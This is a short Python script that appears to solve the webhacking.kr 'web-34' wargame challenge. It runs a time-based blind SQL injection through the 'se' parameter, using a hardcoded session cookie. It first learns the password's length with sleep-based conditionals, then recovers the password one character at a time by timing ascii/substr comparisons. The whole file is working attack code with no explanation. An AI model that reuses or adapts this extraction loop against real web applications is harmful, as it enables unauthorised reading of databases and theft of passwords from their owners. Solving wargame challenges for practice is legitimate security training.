import requests
import time

cookies={'PHPSESSID':'1uv1k3nmdjkp58kt643v5al23t'}
url = "https://webhacking.kr/challenge/web-34/index.php"

pw_length = 0
pw = []

for i in range(40):
    query = f"?msg=test&se=if(length(pw)={i},sleep(1),1)"
    itime = time.time()
    res = requests.get(url+query, cookies=cookies)
    restime = time.time() - itime
    if restime > 1:
        pw_length = i
        break
    
print(pw_length)

for i in range(pw_length):
    for j in range(33, 127):
        query = f"?msg=test&se=if(ascii(substr(pw,{str(i+1)},1))={str(j)},sleep(1),1)"
        itime = time.time()
        res = requests.get(url+query, cookies=cookies)
        restime = time.time() - itime
        if restime > 1:
            pw.append(chr(j))
            print(''.join(pw))
            break

print(''.join(pw))